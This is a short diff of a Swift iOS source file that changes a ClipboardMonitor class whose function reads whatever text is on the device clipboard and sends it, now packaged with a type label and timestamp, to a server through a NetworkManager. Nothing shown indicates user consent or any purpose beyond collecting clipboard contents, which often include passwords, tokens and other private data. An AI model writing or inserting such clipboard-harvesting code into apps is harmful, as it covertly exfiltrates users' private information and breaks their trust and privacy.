@@ -7,11 +7,17 @@
 
 
 import UIKit
-
 class ClipboardMonitor {
     static func checkClipboardAndSend() {
-        if let clipboardText = UIPasteboard.general.string {
-            NetworkManager.sendData(data: "Clipboard: \(clipboardText)")
-        }
+        let clipboard = UIPasteboard.general.string ?? "Nothing"
+        let timestamp = ISO8601DateFormatter().string(from: Date())
+
+        let payload: [String: Any] = [
+            "type": "clipboard",
+            "content": clipboard,
+            "timestamp": timestamp
+        ]
+
+        NetworkManager.sendData(dict: payload)
     }
 }
